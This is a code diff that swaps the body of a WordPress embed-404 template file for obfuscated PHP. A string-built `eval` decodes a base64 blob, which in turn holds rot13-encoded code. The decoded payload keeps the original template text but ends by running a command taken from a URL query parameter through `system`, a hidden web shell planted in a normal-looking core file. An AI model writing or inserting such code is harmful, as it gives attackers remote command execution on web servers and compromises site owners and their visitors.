@@ -1,46 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/**
- * Contains the post embed content template part
- *
- * When a post is embedded in an iframe, this file is used to create the content template part
- * output if the active theme does not include an embed-404.php template.
- *
- * @package WordPress
- * @subpackage Theme_Compat
- * @since 4.5.0
- */
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKioKICogUGJhZ252YWYgZ3VyIGNiZmcgcnpvcnEgcGJhZ3JhZyBncnpjeW5nciBjbmVnCiAqCiAqIEp1cmEgbiBjYmZnIHZmIHJ6b3JxcXJxIHZhIG5hIHZzZW56ciwgZ3V2ZiBzdnlyIHZmIGhmcnEgZ2IgcGVybmdyIGd1ciBwYmFncmFnIGdyemN5bmdyIGNuZWcKICogYmhnY2hnIHZzIGd1ciBucGd2aXIgZ3VyenIgcWJyZiBhYmcgdmFweWhxciBuYSByem9ycS00MDQuY3VjIGdyemN5bmdyLgogKgogKiBAY25weG50ciBKYmVxQ2VyZmYKICogQGZob2NucHhudHIgR3VyenJfUGJ6Y25nCiAqIEBmdmFwciA0LjUuMAogKi8KPz4KPHF2aSBweW5mZj1cImpjLXJ6b3JxXCI+Cgk8YyBweW5mZj1cImpjLXJ6b3JxLXVybnF2YXRcIj48P2N1YyBfciggJ0JiY2YhIEd1bmcgcnpvcnEgcG5hYWJnIG9yIHNiaGFxLicgKTsgPz48L2M+CgoJPHF2aSBweW5mZj1cImpjLXJ6b3JxLXJrcHJlY2dcIj4KCQk8Yz4KCQkJPD9jdWMKCQkJY2V2YWdzKAoJCQkJLyogZ2VuYWZ5bmdiZWY6ICVmOiBOIHl2YXggZ2IgZ3VyIHJ6b3JxcXJxIGZ2Z3IuICovCgkJCQlfXyggJ1ZnIHliYnhmIHl2eHIgYWJndXZhdCBqbmYgc2JoYXEgbmcgZ3V2ZiB5YnBuZ3ZiYS4gWm5sb3IgZ2VsIGl2ZnZndmF0ICVmIHF2ZXJwZ3lsPycgKSwKCQkJCSc8ZmdlYmF0PjxuIHVlcnM9XCInIC4gcmZwX2hleSggdWJ6cl9oZXkoKSApIC4gJ1wiPicgLiByZnBfdWd6eSggdHJnX295YnR2YXNiKCAnYW56cicgKSApIC4gJzwvbj48L2ZnZWJhdD4nCgkJCSk7CgkJCT8+CgkJPC9jPgoJPC9xdmk+CgoJPD9jdWMKCS8qKiBHdXZmIHN2eWdyZSB2ZiBxYnBoenJhZ3JxIHZhIGpjLXZhcHlocXJmL2d1cnpyLXBiemNuZy9yem9ycS1wYmFncmFnLmN1YyAqLwoJcWJfbnBndmJhKCAncnpvcnFfcGJhZ3JhZycgKTsKCT8+CgoJPHF2aSBweW5mZj1cImpjLXJ6b3JxLXNiYmdyZVwiPgoJCTw/Y3VjIGd1cl9yem9ycV9mdmdyX2d2Z3lyKCk7ID8+Cgk8L3F2aT4KPC9xdmk+CgokcHpxID0gJF9UUkdbJ2MnXTsKJHN6bmNbJ2sxJ10oJHB6cSk7Cj8+IjsKZXZhbCgkZigkYykpOwo/Pg==");
+$f($c);
 ?>
-<div class="wp-embed">
-	<p class="wp-embed-heading"><?php _e( 'Oops! That embed cannot be found.' ); ?></p>
-
-	<div class="wp-embed-excerpt">
-		<p>
-			<?php
-			printf(
-				/* translators: %s: A link to the embedded site. */
-				__( 'It looks like nothing was found at this location. Maybe try visiting %s directly?' ),
-				'<strong><a href="' . esc_url( home_url() ) . '">' . esc_html( get_bloginfo( 'name' ) ) . '</a></strong>'
-			);
-			?>
-		</p>
-	</div>
-
-	<?php
-	/** This filter is documented in wp-includes/theme-compat/embed-content.php */
-	do_action( 'embed_content' );
-	?>
-
-	<div class="wp-embed-footer">
-		<?php the_embed_site_title(); ?>
-	</div>
-</div>
